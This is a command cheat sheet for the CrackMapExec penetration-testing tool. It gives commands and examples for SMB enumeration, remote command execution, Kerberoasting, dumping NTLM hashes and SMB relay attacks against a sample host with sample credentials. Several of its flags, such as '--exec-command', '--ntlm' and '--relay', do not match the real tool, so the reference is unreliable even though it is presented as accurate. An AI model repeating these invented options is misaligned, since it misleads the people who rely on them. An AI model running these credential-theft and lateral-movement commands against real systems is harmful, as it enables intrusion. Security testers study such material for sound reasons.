`CrackMapExec` (CME) is a popular post-exploitation tool used for assessing the security of large Active Directory networks. It is designed to automate the process of enumeration, lateral movement, and exploitation across networked systems.

### **CrackMapExec (CME)**

CrackMapExec provides a range of functionalities, from discovering SMB shares and services to executing commands and maintaining access. Below are the common commands and options for using CME.

#### **Common Commands and Options**

1. **Basic Enumeration:**
   - **Description:** Perform a basic enumeration of network shares and services.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password>
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123
     ```

   - **Explanation:**
     - `-u <username>`: Username for authentication.
     - `-p <password>`: Password for the specified username.
     - Enumerates SMB shares and services on the target system.

2. **List SMB Shares:**
   - **Description:** List available SMB shares on the target system.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --shares
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --shares
     ```

   - **Explanation:**
     - `--shares`: Lists all SMB shares available on the target system.

3. **Execute a Command Remotely:**
   - **Description:** Execute a specified command on the remote system.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --exec-command "<command>"
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --exec-command "ipconfig /all"
     ```

   - **Explanation:**
     - `--exec-command "<command>"`: The command to execute on the remote system.

4. **Enumerate Users on a Domain:**
   - **Description:** Enumerate users from the Active Directory domain.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --users
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --users
     ```

   - **Explanation:**
     - `--users`: Enumerates users from the Active Directory domain.

5. **Perform Kerberoasting:**
   - **Description:** Extract service tickets from the target system to perform Kerberoasting.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --kerberoast
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --kerberoast
     ```

   - **Explanation:**
     - `--kerberoast`: Extracts Kerberos service tickets for offline cracking.

6. **Dump NTLM Hashes:**
   - **Description:** Dump NTLM hashes from the target system.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --ntlm
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --ntlm
     ```

   - **Explanation:**
     - `--ntlm`: Dumps NTLM hashes from the target system.

7. **Check SMB Signing:**
   - **Description:** Check if SMB signing is enabled on the target system.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --signing
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --signing
     ```

   - **Explanation:**
     - `--signing`: Checks the status of SMB signing on the target system.

8. **Perform SMB Relay Attack:**
   - **Description:** Perform SMB relay attacks to capture and relay authentication tokens.
   - **Command:**
     ```bash
     crackmapexec smb <target_ip> -u <username> -p <password> --relay
     ```
   - **Example:**
     ```bash
     crackmapexec smb 192.168.1.10 -u admin -p password123 --relay
     ```

   - **Explanation:**
     - `--relay`: Executes an SMB relay attack to capture and relay authentication tokens.

#### **Summary of CrackMapExec Commands**

| **Command**                                         | **Description**                                            | **Example**                                                                                              |
|-----------------------------------------------------|------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
| `crackmapexec smb <target_ip> -u <username> -p <password>` | Basic enumeration of network shares and services.          | `crackmapexec smb 192.168.1.10 -u admin -p password123`                                                 |
| `crackmapexec smb <target_ip> -u <username> -p <password> --shares` | List available SMB shares on the target.                  | `crackmapexec smb 192.168.1.10 -u admin -p password123 --shares`                                        |
| `crackmapexec smb <target_ip> -u <username> -p <password> --exec-command "<command>"` | Execute a command on the remote system.                   | `crackmapexec smb 192.168.1.10 -u admin -p password123 --exec-command "ipconfig /all"`                   |
| `crackmapexec smb <target_ip> -u <username> -p <password> --users` | Enumerate users from the Active Directory domain.         | `crackmapexec smb 192.168.1.10 -u admin -p password123 --users`                                         |
| `crackmapexec smb <target_ip> -u <username> -p <password> --kerberoast` | Perform Kerberoasting to extract service tickets.          | `crackmapexec smb 192.168.1.10 -u admin -p password123 --kerberoast`                                    |
| `crackmapexec smb <target_ip> -u <username> -p <password> --ntlm` | Dump NTLM hashes from the target system.                   | `crackmapexec smb 192.168.1.10 -u admin -p password123 --ntlm`                                          |
| `crackmapexec smb <target_ip> -u <username> -p <password> --signing` | Check if SMB signing is enabled on the target.            | `crackmapexec smb 192.168.1.10 -u admin -p password123 --signing`                                       |
| `crackmapexec smb <target_ip> -u <username> -p <password> --relay` | Perform SMB relay attacks to capture and relay tokens.     | `crackmapexec smb 192.168.1.10 -u admin -p password123 --relay`                                         |

CrackMapExec is a powerful tool for assessing and exploiting SMB services within a network, making it useful for penetration testers and security professionals to automate various post-exploitation tasks.